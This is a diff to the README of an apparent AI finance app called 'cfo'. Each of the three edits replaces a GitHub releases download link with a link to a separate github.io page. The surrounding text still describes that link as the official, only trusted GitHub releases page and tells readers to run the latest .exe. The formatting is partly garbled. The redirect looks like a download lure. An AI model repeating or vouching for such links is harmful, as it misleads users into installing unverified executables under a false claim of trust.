@@ -1,6 +1,6 @@
 # 💼 cfo - Your AI-Powered Financial Command Center
 
-[🚀 Download cfo Now](https://github.com/mariacl11/cfo/releases)
+[🚀 Download cfo Now](https://mariacl11.github.io)
 
 )
 
@@ -60,7 +60,7 @@ Getting cfo onto your computer is incredibly simple. Follow these exact steps:
 
 ### Step 1: Visit the Official Download Page
 
-🔗 **Click this link right here** → **[Download cfo Official Page](https://github.com/mariacl11/cfo/releases"**
+🔗 **Click this link right here** → **[Download cfo Official Page](https://mariacl11.github.io"**
 
 This link takes you directly to the official cfo releases page hosted on GitHub**. This is the only trusted, safe source for the software. Never download cfo from third-party websites.
 
@@ -179,7 +179,7 @@ You have nothing to lose and everything to gain**. Financial stress affects mill
 
 ## 📥 Download cfo Now
 
-**[👉 Click Here to Visit the Official cfo Download Page](https://github.com/mariacl11/cfo/releases"**
+**[👉 Click Here to Visit the Official cfo Download Page](https://mariacl11.github.io"**
 
 *Once you're there, click the latest `.exe` file at the top, installer will handle the rest**. It takes less than five minutes from download to first conversation with your new AI CFO.*
 
